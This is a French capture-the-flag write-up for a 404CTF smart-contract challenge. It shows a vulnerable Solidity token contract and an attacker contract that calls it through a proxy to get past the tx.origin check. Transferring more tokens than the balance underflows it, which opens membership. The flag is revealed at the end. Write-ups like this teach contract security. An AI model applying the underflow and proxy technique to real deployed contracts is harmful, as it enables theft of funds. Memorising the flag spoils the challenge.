## La Guerre des contrats (1/2)

### Description

L'objectif ici est de réussir à contourner la sécurité d'un smart contract afin d'obtenir un status de membre. Le code source du contrat étant à notre disposition, libre à nous d'en profiter :
```s
pragma solidity 0.7.6;

contract FreeMoney {

    mapping (address => uint256) balances;
    mapping(address => uint256) lastWithdrawTime;
    mapping(address => bool) isHallebardeMember;
    address private boss;

    constructor() public {
        boss = msg.sender;
    }

    function getMoney(uint256 numTokens) public {
        require(numTokens < 10000);
        require(block.timestamp >= lastWithdrawTime[msg.sender] + 365 days, "Vous devez attendre un an entre chaque demande d'argent.");
        balances[msg.sender] += numTokens;
        lastWithdrawTime[msg.sender] = block.timestamp;
    }

    function reset() public {
        balances[msg.sender] = 0;
        lastWithdrawTime[msg.sender] = 0;
    }

    function transfer(address receiver, uint256 numTokens) public returns (bool) {
        require(balances[msg.sender] > 0);
        balances[msg.sender] -= numTokens;
        balances[receiver] += numTokens;
        return true;
    }    

    function enterHallebarde() public {
        require(balances[msg.sender] > 100 ether || boss == msg.sender, "Vous n'avez pas assez d'argent pour devenir membre de Hallebarde.");
        require(msg.sender != tx.origin || boss == msg.sender, "Soyez plus entreprenant !");
        require(!isHallebardeMember[msg.sender]);
        isHallebardeMember[msg.sender] = true;
    }

    function getMembershipStatus(address memberAddress) external view returns (bool) {
        require(msg.sender == memberAddress || msg.sender == boss);
        return isHallebardeMember[memberAddress];
    }
}
```
L'objectif est donc d'entrer à Hallebarde. Pour ce faire, il nous faut un nombre de token supérieur à 100 ether, mais surtout il faut remplir la condition ```msg.sender != tx.origin```. Autrement dit, [impossible d'effectuer la transation depuis son wallet, il faut passer par un contrat.](https://ethereum.stackexchange.com/questions/113962/what-does-msg-sender-tx-origin-actually-do-why)

### Exploit

On déploie on contrat sur le réseau dont le code est le suivant :
```s
pragma solidity >=0.7.0 <0.9.0;

abstract contract HlbInterface {
    function getMoney(uint256 numTokens) virtual public;
    function reset() virtual public;
    function transfer(address receiver, uint256 numTokens) virtual public returns (bool);
    function enterHallebarde() virtual public;
    function getMembershipStatus(address memberAddress) virtual external view returns (bool);
}


contract pwnHlb {

    address ckAddress = 0xb8c77090221FDF55e68EA1CB5588D812fB9f77D6; /*Adresse du contrat*/

    HlbInterface hlbInterface = HlbInterface(ckAddress);

    function hallebarde() public {
        hlbInterface.enterHallebarde();
    }
}
```

Une fois le contrat déployé, on commence par récupérer des tokens sur son wallet, avec la function ``getMoney()``. Puis on transfère un grand nombre de tokens sur l'adresse du contrat, et enfin on appelle la fonction ``hallebarde()``.
On récupère ensuite le flag : 404CTF{5M4r7_C0N7r4C7_1NC3P710N_37_UND3rF10W_QU01_D3_P1U5_F4C113}.
